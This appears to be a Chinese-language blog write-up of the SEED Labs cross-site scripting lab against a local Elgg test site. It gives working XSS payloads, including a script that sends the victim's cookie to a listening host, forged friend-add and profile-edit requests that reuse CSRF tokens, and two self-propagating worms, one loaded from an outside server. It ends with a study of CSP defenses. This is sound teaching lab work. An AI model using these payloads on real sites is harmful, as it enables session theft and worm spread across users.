---
layout: post
title: "Cross-Site Scripting (XSS) Attack Lab"
date: 2024-04-26
categories: [SEED Labs, Web Security]
tags: [XSS]
---

# Cross-Site Scripting (XSS) Attack Lab

# Lab Setup

我用的是mac M2芯片，所以要去官网下载arm64版本，然后启动docker。浏览器使用的是84版Chrome。

需要在/etc/hosts中配置域名，虽然我用我自己的电脑这么做不是很安心，然后把梯子关了才能正确访问，可能是因为vpn软件会绕过本机的DNS解析方式。

# Task 1: Posting a Malicious Message to Display an Alert Window

在brief description中输入一条XSS脚本。

```html
<script>alert(1)</script>
```

# Task 2: Posting a Malicious Message to Display Cookies

把XSS脚本换成：

```html
<script>alert(document.cookie);</script>
```

# Task 3: Stealing Cookies from the Victim’s Machine

这个task就是使用DOM API让victim发送自己的cookie，这里我的mac监听10.9.0.1端口什么都收不到，tcpdump可以看到有tcp连接但是没有回应，所以我直接把脚本改成发到本地，在实际应用时改称自己的服务器地址就好：

```html
<script>document.write('<img src=http://127.0.0.1:5555?c=' + escape(document.cookie) + ' >'); </script>
```

# Task 4: Becoming the Victim’s Friend

抓包看一下加好友的请求：

![Untitled](/assets/img/2024-04-26-Cross-Site Scripting (XSS) Attack Lab/Untitled.png)

在about me里边构造一个JS脚本，这里有个坑，复制进about me的使用会语法错误，token右边有很多奇怪的看不到的符号，需要手动删掉。

```html
<script type="text/javascript"> 
		window.onload = function () { 
		var Ajax=null; 
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // **➀**
		var token="&__elgg_token="+elgg.security.token.__elgg_token; // **➁**
		var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token; 
		Ajax=new XMLHttpRequest(); 
		Ajax.open("GET", sendurl, true); 
		Ajax.send(); 
		} 
</script>
```

然后用alice访问一下，可以看到添加好友成功。

**Question 1: Explain the purpose of Lines ➀ and ➁, why are they are needed?**

我在docker里边用指令搜索’__elgg_token’：

```bash
grep -rnw './' -e "__elgg_token"
```

找到了负责检查CSRF的文件’/var/www/elgg/vendor/elgg/elgg/engine/classes/Elgg/Security/Csrf.php’，然后在里边找到了检查的代码：

```php
public function validate(Request $request) {
		$token = $request->getParam('__elgg_token');
		$ts = $request->getParam('__elgg_ts');
		...
}
```

所以需要把这两个参数传递过去，这属于简单的CSRF防御。

**Question 2: If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?**

about me这部分确实不能注入了，我之前在CSRF那个实验里用一个错的图片链接发了一个好友申请成功了，比如设置图片的url为”http://www.seed-server.com/action/friends/add?friend=59”，但是这个实验还要检查两个token我想不到什么好的办法。

但是之前发现brief description检查不严，所以在这里变注入JS脚本一样可以成功，经过试验发现确实可以。

# Task 5: Modifying the Victim’s Profile

编辑profile，抓包可以看到各个参数名。

修改脚本， `content` 中写上payload。

```html
<script type="text/javascript">
		window.onload = function(){
				var userName="&name="+elgg.session.user.name;
				var guid="&guid="+elgg.session.user.guid;
				var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
				var token="&__elgg_token="+elgg.security.token.__elgg_token;
				var content="briefdescription=I love J3rry!" + userName + guid + ts + token;
				var samyGuid=59; //FILL IN
				var sendurl="http://www.seed-server.com/action/profile/edit";
				if(elgg.session.user.guid!=samyGuid) // **➀**
				{
						var Ajax=null;
						Ajax=new XMLHttpRequest();
						Ajax.open("POST", sendurl, true);
						Ajax.setRequestHeader("Content-Type",
						"application/x-www-form-urlencoded");
						Ajax.send(content);
				}
}
</script>
```

**Question 3: Why do we need Line ➀? Remove this line, and repeat your attack. Report and explain your observation.**

这段就是为了防止自己被修改，如果移除了这段那samy访问自己profile的时候自己的profile也会被修改。

# Task 6: Writing a Self-Propagating XSS Worm

## **Link Approach**

使用python开一个服务，然后在当前目录下写下’worm.js’，内容是一个蠕虫脚本，首先添加Samy为好友，然后进行自复制传播：

```jsx
window.onload = function(){
		var Ajax=null; 
		var userName="&name="+elgg.session.user.name;
		var guid="&guid="+elgg.session.user.guid;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token; 
		Ajax=new XMLHttpRequest(); 
		Ajax.open("GET", sendurl, true); 
		Ajax.send(); 
		
		var userName="&name="+elgg.session.user.name;
		var guid="&guid="+elgg.session.user.guid;
		var content="briefdescription=" + encodeURIComponent('<script src="http://127.0.0.1:8888/worm.js"></script>') + userName + guid + ts + token;
		var samyGuid=59;
		var sendurl="http://www.seed-server.com/action/profile/edit";
		if(elgg.session.user.guid!=samyGuid)
		{
				var Ajax=null;
				Ajax=new XMLHttpRequest();
				Ajax.open("POST", sendurl, true);
				Ajax.setRequestHeader("Content-Type",
				"application/x-www-form-urlencoded");
				Ajax.send(content);
		}
}
```

这里有一些细节， `encodeURIComponent` 这个函数可以把一些空格之类的转义。不要转义其他的字符串，否则有可能’=’也会被转义。

在Samy中注入脚本：

```jsx
<script src="http://127.0.0.1:8888/worm.js"></script>
```

先使用Alice访问Samy，然后再用Boby访问Alice，发现大家的brief description都变成了这段脚本，并且添加Samy为好友。

## DOM Approach

利用id来获取html内容然后自复制，代码如下：

```html
<script id="worm">
window.onload = function(){
		var Ajax=null; 
		var userName="&name="+elgg.session.user.name;
		var guid="&guid="+elgg.session.user.guid;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token; 
		Ajax=new XMLHttpRequest(); 
		Ajax.open("GET", sendurl, true); 
		Ajax.send(); 
		
		var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
		var jsCode = document.getElementById("worm").innerHTML;
		var tailTag = "</" + "script>";
		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
		
		var userName="&name="+elgg.session.user.name;
		var guid="&guid="+elgg.session.user.guid;
		var content="briefdescription=" + wormCode + userName + guid + ts + token;
		var samyGuid=59;
		var sendurl="http://www.seed-server.com/action/profile/edit";
		if(elgg.session.user.guid!=samyGuid)
		{
				var Ajax=null;
				Ajax=new XMLHttpRequest();
				Ajax.open("POST", sendurl, true);
				Ajax.setRequestHeader("Content-Type",
				"application/x-www-form-urlencoded");
				Ajax.send(content);
		}
}
</script>
```

经过同样的测试可以发现Boby的brief description同样被修改。

# Task 7: Defeating XSS Attacks Using CSP

首先观察一下现象。

www.examplea.com：

![Screenshot 2024-04-26 at 3.13.29 PM.png](/assets/img/2024-04-26-Cross-Site Scripting (XSS) Attack Lab/Screenshot_2024-04-26_at_3.13.29_PM.png)

www.exampleb.com：

![Screenshot 2024-04-26 at 3.14.04 PM.png](/assets/img/2024-04-26-Cross-Site Scripting (XSS) Attack Lab/Screenshot_2024-04-26_at_3.14.04_PM.png)

www.examplec.com：

![Screenshot 2024-04-26 at 3.14.16 PM.png](/assets/img/2024-04-26-Cross-Site Scripting (XSS) Attack Lab/Screenshot_2024-04-26_at_3.14.16_PM.png)

并且只有第一个按钮有效。

apache配置：

```
# Purpose: Do not set CSP policies
<VirtualHost *:80>
DocumentRoot /var/www/csp
ServerName www.example32a.com
DirectoryIndex index.html
</VirtualHost>
# Purpose: Setting CSP policies in Apache configuration
<VirtualHost *:80>
DocumentRoot /var/www/csp
ServerName www.example32b.com
DirectoryIndex index.html
Header set Content-Security-Policy " \
default-src ’self’; \
script-src ’self’ *.example70.com \
"
</VirtualHost>
# Purpose: Setting CSP policies in web applications
<VirtualHost *:80>
DocumentRoot /var/www/csp
ServerName www.example32c.com
DirectoryIndex
```

可以看到对于www.examplea.com来说什么安全设置都没有，并且JS脚本正确制定了nonce，所以全部都是OK，button也可以正常执行。

对于www.exampleb.com，前两个没有正确配置nonce，所以没有正确执行，第三个脚本中没有nonce，CSP默认这样的脚本也不会执行。由于CSP设置只允许自己的内容以及自己和*.example70.com的JS脚本，所以4和6正常执行，5不可以。除非指明’**unsafe-inline**’，否则CSP禁止类似的onclick行为，所以button也没有正常执行。

对于www.examplec.com，他把入口点改为phpindex.php：

```php
<?php
  $cspheader = "Content-Security-Policy:".
               "default-src 'self';".
               "script-src 'self' 'nonce-111-111-111' *.example70.com".
               "";
  header($cspheader);
?>

<?php include 'index.html';?>
```

这里和www.exampleb.com不同的就是，对于脚本的来源，带有'nonce-111-111-111’的内联脚本可以执行，所以在这里1对应的脚本可以执行。

修改配置文件：

```
# Purpose: Setting CSP policies in Apache configuration
<VirtualHost *:80>
DocumentRoot /var/www/csp
ServerName www.example32b.com
DirectoryIndex index.html
Header set Content-Security-Policy " \
default-src ’self’; \
script-src ’self’ *.example60.com *.example70.com \
"
```

重启apache server：

```bash
service apache2 restart
```

可以看到www.example60.com的脚本同样可以执行。

修改phpindex.php文件：

```php
<?php
  $cspheader = "Content-Security-Policy:".
               "default-src 'self';".
               "script-src 'self' 'nonce-111-111-111' 'nonce-222-222-222' .example60.com *.example70.com".
               "";
  header($cspheader);
?>

<?php include 'index.html';?>
```

使得12456都可以运行。

CSP防御由浏览器来执行。浏览器首先读取CSP的策略，根据策略来决定哪些行为是被允许的。
